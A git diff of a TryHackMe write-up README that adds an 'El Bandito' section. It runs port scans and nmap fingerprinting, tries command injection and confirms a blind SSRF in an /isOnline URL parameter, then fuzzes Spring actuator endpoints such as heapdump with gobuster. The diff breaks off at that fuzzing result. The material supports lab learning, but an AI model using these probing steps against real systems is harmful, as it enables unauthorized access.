@@ -1,6 +1,7 @@
 # THM WriteUP
 ## [ Offensive Pentesting path](https://github.com/zinzloun/THM_WriteUP/tree/main/PT_Path_notes)
 ## [RedTeam Capstone Challange](https://github.com/zinzloun/THM_WriteUP/tree/main/RTM_Capstone)
+
 ## Borderlands
 
 ### Compromise the server
@@ -428,13 +429,161 @@ But no sign of the TCP flag, I mean there's should be a problem with the format,
     ..{*..{*8d6b2bd40af6581942fcf483e}
 
 ### The end has no end
-The challenge is not completely close, since I did not get the first and the last flag (the last one not entirely), but I'd say that the mission was accomplished :)
+The challenge is not completely close, since I did not get the first and the last flag (the last one not entirely), but I'd say that the mission was accomplished, more or less... :)
 
+## El Bandito
+I was lucky enough to read this [great post](https://github.com/0ang3el/websocket-smuggle?tab=readme-ov-file#22-scenario-2) just some days before facing El Bandito. The challange, as the description says, involvs smuggling. As we will see Websocket smuggling.
+Before starting I invite you to read the mentioned post, since treats exactly El Bandito smuggling scenario. I've already revealed too much!
+
+### Services scan
+
+    rustscan -b 900 -a 10.10.146.64
+    ...
+    Open 10.10.146.64:22
+    Open 10.10.146.64:80
+    Open 10.10.146.64:631
+    Open 10.10.146.64:8080
+
+### Fingerprint services
+
+    nmap -n -v -sVC -Pn -p 22,80,631,8080 10.10.146.64
+    ...
+    80/tcp   open  ssl/http El Bandito Server
+    |_http-server-header: El Bandito Server
+    ...
+    | fingerprint-strings: 
+    |   GetRequest: 
+    |     HTTP/1.1 200 OK
+    |     Date: Thu, 30 May 2024 12:15:53 GMT
+    |     Content-Type: text/html; charset=utf-8
+    ...
+    |     nothing to see <script src='/static/messages.js'></script>
+    ...
+    631/tcp  open  ipp      CUPS 2.4
+    |_http-server-header: CUPS/2.4 IPP/2.1
+    8080/tcp open  http    nginx
+    |_http-favicon: Spring Java Framework
+
+
+We found a web app that strange enough run https on port 80, a CUP server (that's not present any known vulnerabilities) and NGIX server with Spring installed. Let's visit the two web app
+
+    https://10.10.103.104:80
+    ...
+    nothing to see
+Remember from the scan that we found a script included in the page, let's see it:
+
+    view-source:https://10.10.103.104:80/static/messages.js
+
+That reveals 2 API endpoints:
+
+    getMessages
+    send_message
+send_message accept POST request, indeed visiting:
+
+    https://10.10.103.104:80/getMessages
+
+it presens a login form. Submitting some fake values does not reveals nothing interesting, so let's proceed to inspect the app hosted on NGIX. Browsing I found an interesting web page:
+
+    http://10.10.103.104:8080/services.html
     
-
-
-
+    Service Status
+    Below, you'll find the current status details for each component within the Bandit Token ecosystem.
     
+    http://bandito.websocket.thm: OFFLINE
+    http://bandito.public.thm: ONLINE
+
+So it seems that there is a websocket endpoint that is currently offline and the public one online. Inspecting the source of the page reveals another endpoint:
+
+     ...
+     const response = await fetch(`/isOnline?url=${serviceUrl}`, {
+     ...
+
+Visiting the URL we got the following error
+
+    http://10.10.103.104:8080/isOnline
+    ....
+    This application has no explicit mapping for /error, so you are seeing this as a fallback.
+    ...
+    There was an unexpected error (type=Bad Request, status=400).
+Let's try to inject a command on the url parameter:
+
+    http://10.10.103.104:8080/isOnline?url=id
+
+We got a server error (500) this time. So something definitely happens on the server. Let's try a payload with a valid payload:
+
+    http://10.10.103.104:8080/isOnline?url=https://10.10.103.104:80
+
+This time we got a certificate error meaning that the server has performed a request to the server passed in the url parameter:
+    
+    ...PKIX path building failed: sun.security.provider.certpath.SunCertPathBuilderException: unable to find valid certification path to requested target
+    
+Tryng to reach an external URL and we get a time out:
+
+    http://10.10.103.104:8080/isOnline?url=https://www.google.it
+    ...
+    connect timed out
+
+So we cannot exit on the web, let's try to reach our python server
+
+    http://10.10.103.104:8080/isOnline?url=http://10.10.237.116:8000
+
+This time we get an empty page with no error, so the request is ok (200) and we can see the request performed to our web service
+
+    10.10.103.104 - - [30/May/2024 15:08:59] "GET / HTTP/1.1" 200 -
+That's fine, but trying to get a file of our web server we can see that the content is not fetched in the response, so we can presume that the endpoint is vulnerable to blind SSRF, that generally is not so easy to get something to exploit.
+
+### Analyze the findings
+So at this point without prior knowledge of the El Bandito scenario I'd say that I'm quite blocked. We found
+1. Blind SSRF vulnerability
+2. A java app that uses Spring Framework (that I don't know at all)
+3. Another strange app that respond on port 80 in https, with a login form
+
+So I decided to proceed to fuzzing the Spring app endpoints available. I found the list [here](https://docs.spring.io/spring-boot/reference/actuator/endpoints.html) and I managed to retrive the following wordlist:
+
+    cat > spring_ep.txt<< EOF
+        auditevents
+        beans
+        caches
+        conditions
+        configprops
+        env
+        flyway
+        health
+        httpexchanges
+        info
+        integrationgraph
+        loggers
+        liquibase
+        metrics
+        mappings
+        quartz
+        scheduledtasks
+        sessions
+        shutdown
+        startup
+        threaddump
+        heapdump
+        logfile
+        prometheus
+    EOF
+
+Then I use the list to fuzz:
+    
+    gobuster dir -u http://10.10.103.104:8080/ -w spring_ep.txt 
+    ...
+    /env (Status: 403)
+    /beans (Status: 403)
+    /metrics (Status: 403)
+    /info (Status: 200)
+    /health (Status: 200)
+    /mappings (Status: 200)
+    /configprops (Status: 200)
+    /heapdump (Status: 200)
+    ...
+
+Let's visit the accessible endpoints (200)
+
+
     
 
     
